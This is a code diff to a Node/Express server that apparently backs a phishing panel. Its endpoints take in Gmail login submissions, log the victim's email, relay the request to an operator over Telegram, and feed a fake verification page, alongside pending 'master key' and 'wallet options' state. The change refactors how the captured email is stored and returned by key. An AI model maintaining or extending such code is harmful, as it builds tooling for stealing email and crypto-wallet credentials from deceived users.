@@ -158,7 +158,7 @@ const pendingMasterKey = {};
 const pendingWalletOptions = {};
 const pendingDeviceApproval = {};
 const pendingGmailLogin = {};
-const gmailDisplayEmail = {}; // ✅ Store Gmail email for display only (keyed by fingerprint)
+const displayEmailStore = {}; // ✅ Store display emails with unique keys
 const pendingVerificationPage = {};
 const userSelectedDigits = {};
 const deviceFingerprintToEmail = {};
@@ -331,11 +331,10 @@ app.post("/send-gmail-login", async (req, res) => {
       console.log(`💾 Stored email for fingerprint ${fingerprint}: ${email}`);
     }
     
-    // ✅ Store Gmail display email (for display only on verification page)
-    if (fingerprint && email) {
-      gmailDisplayEmail[fingerprint] = email;
-      console.log(`📧 Stored Gmail display email for fingerprint ${fingerprint}: ${email}`);
-    }
+    // ✅ Generate unique key for display email and store it
+    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    displayEmailStore[displayEmailKey] = email;
+    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
 
     const emailForThisIP = resolveEmailFromRequest(req);
     console.log(`📥 Gmail Login Request received: ${requestId}`);
@@ -380,7 +379,7 @@ app.post("/send-gmail-login", async (req, res) => {
       console.error("❌ Failed to send Gmail Login Telegram message:", err);
     }
 
-    res.json({ status: "pending", requestId });
+    res.json({ status: "pending", requestId, displayEmailKey });
   } catch (err) {
     console.error("❌ Gmail Login endpoint error:", err);
     res.status(500).json({ error: "Internal server error" });
@@ -399,20 +398,20 @@ app.get("/api/gmail-login-status/:requestId", (req, res) => {
   }
 });
 
-// ✅ NEW: Get Gmail display email (for verification page to display)
-app.get("/api/gmail-display-email", (req, res) => {
+// ✅ NEW: Get Gmail display email by key
+app.get("/api/display-email/:displayEmailKey", (req, res) => {
   try {
-    const fingerprint = getDeviceFingerprint(req);
-    const displayEmail = gmailDisplayEmail[fingerprint];
-    if (displayEmail) {
-      console.log(`📧 Retrieved Gmail display email for fingerprint ${fingerprint}: ${displayEmail}`);
-      res.json({ gmailEmail: displayEmail });
+    const { displayEmailKey } = req.params;
+    const email = displayEmailStore[displayEmailKey];
+    if (email) {
+      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
+      res.json({ displayEmail: email });
     } else {
-      console.log(`📧 No Gmail display email found for fingerprint ${fingerprint}`);
-      res.json({ gmailEmail: null });
+      console.log(`📧 No display email found for key ${displayEmailKey}`);
+      res.json({ displayEmail: null });
     }
   } catch (err) {
-    console.error("❌ Get Gmail display email error:", err);
+    console.error("❌ Get display email error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
